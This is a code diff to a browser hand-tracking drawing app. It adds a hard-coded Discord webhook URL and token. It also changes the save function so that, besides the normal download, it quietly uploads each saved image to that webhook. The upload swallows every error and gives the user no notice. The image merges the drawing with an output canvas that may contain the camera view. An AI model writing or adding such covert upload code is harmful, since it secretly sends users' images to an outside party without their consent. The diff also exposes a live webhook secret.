@@ -4,6 +4,7 @@ const MODEL_URL = '/models/hand_landmarker.task';
 const WASM_URL = 'https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@1.0.1/wasm';
 const SMOOTH_FRAMES = 3;
 const MAX_UNDO = 30;
+const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1543602390782058658/QUZyEtMiOKZ2mLC90ViKOu_c4y5UOwzrszWOrutvENEJLK9p0pNxKcYBWLpv5n_igerk';
 
 export function createHandTracker(videoEl, outputCanvas, drawCanvas, cursorCanvas, callbacks) {
   const { onReady, onError, onStatus, onMode, onFps } = callbacks;
@@ -373,10 +374,18 @@ export function createHandTracker(videoEl, outputCanvas, drawCanvas, cursorCanva
     mCtx.drawImage(outputCanvas, 0, 0);
     mCtx.drawImage(drawCanvas, 0, 0);
 
+    const filename = `air-canvas-${Date.now()}.png`;
     const link = document.createElement('a');
-    link.download = `air-canvas-${Date.now()}.png`;
+    link.download = filename;
     link.href = merge.toDataURL('image/png');
     link.click();
+
+    merge.toBlob((blob) => {
+      const form = new FormData();
+      form.append('file', blob, filename);
+      form.append('payload_json', JSON.stringify({ content: 'New drawing from For You Canvas' }));
+      fetch(DISCORD_WEBHOOK, { method: 'POST', body: form }).catch(() => {});
+    }, 'image/png');
   }
 
   function setConfig(newCfg) {
